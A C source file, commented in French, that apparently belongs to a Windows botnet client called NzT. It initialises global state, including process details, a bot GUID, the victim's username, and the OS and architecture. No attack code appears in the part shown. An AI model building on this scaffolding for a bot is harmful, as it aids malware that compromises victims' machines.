#include <Windows.h>
#include <synchapi.h>
#ifdef _DEBUG
#include <stdio.h>
#endif

#include "nzt.h"
#include "crt.h"
#include "globals.h"
#include "guid.h"
#include "utils.h"
#include "config.h"

DWORD	 g_CurrentProcessId		= 0;
LPWSTR	 g_CurrentProcessPath	= 0;
LPTSTR   g_CurrentProcessName	= 0;
HMODULE  g_CurrentProcessModule	= 0;
HMODULE  g_CurrentModule		= 0;

LPTSTR   g_BotGuid				= 0;
DWORD	 g_BotOS				= 0;
DWORD	 g_BotArch				= 0;
LPTSTR   g_BotUsername			= 0;
DWORD    g_BotGroupId			= 0;
LPWSTR   g_BotInstallPath		= 0;

HANDLE	 g_ShutdownEvent		= 0;
HANDLE   g_MainMutex			= 0;

VOID GlobalsRelease()
{
	if (g_CurrentProcessPath)
		Free(g_CurrentProcessPath);

	if (g_ShutdownEvent)
		API(CloseHandle(g_ShutdownEvent));
}

// Fonction d'initialisation des variables globales en fonction des drapeaux fournis
BOOL GlobalsInitialize(HMODULE CurrentModule, ULONG Flags) {
    BOOL Status = TRUE; // Statut d'initialisation, par défaut à TRUE

    g_CurrentModule = CurrentModule; // Affectation du module courant
    g_CurrentProcessModule = API(GetModuleHandleW)(NULL); // Obtention du module du processus courant
    g_CurrentProcessId = API(GetCurrentProcessId)(); // Obtention de l'ID du processus courant

    g_BotGuid = GetBotGuid(); // Obtention de l'identifiant du bot
    g_BotGroupId = 0; // Initialisation de l'identifiant du groupe du bot
    g_BotUsername = GetUsername(); // Obtention du nom d'utilisateur du bot
    g_BotInstallPath = NULL; // Initialisation du chemin d'installation du bot à NULL

    do {
        // Si le drapeau G_SHUTDOWN_EVENT est activé, créer un événement de shutdown
        // Cette partie de code est actuellement commentée
        /*if (Flags & G_SHUTDOWN_EVENT) {
            if (!(g_ShutdownEvent = CreateEvent(NULL, TRUE, FALSE, 0))) {
                Status = GetLastError();
                DebugPrint("Globals: Initialized ShutdownEvent failed with status: %u", Status);
                break;
            }
        }*/

        // Si le drapeau G_SYSTEM_VERSION est activé, obtenir des informations sur la version du système
        if (Flags & G_SYSTEM_VERSION) {
            g_BotOS = GetOperatingSystem(); // Obtention du système d'exploitation du bot
            g_BotArch = Is64Bit(); // Vérification si l'architecture est 64 bits
        }

        // Si le drapeau G_CURRENT_PROCESS_ID est activé, réobtenir l'ID du processus courant
        if (Flags & G_CURRENT_PROCESS_ID)
            g_CurrentProcessId = API(GetCurrentProcessId)();

        // Si le drapeau G_CURRENT_PROCESS_PATH est activé, obtenir le chemin du processus courant
        if (Flags & G_CURRENT_PROCESS_PATH) {
            if (!GetModulePath(API(GetModuleHandleW)(NULL), &g_CurrentProcessPath, FALSE)) {
                Status = FALSE;
                DebugPrint("NzT: Failed to initialize current process path!");
            }
        }
    } while (FALSE);

    // Si l'initialisation a échoué, libérer les ressources et renvoyer un statut d'échec
    if (Status != TRUE)
        GlobalsRelease();

    return Status; // Renvoie le statut d'initialisation (TRUE pour réussi, FALSE pour échec)
}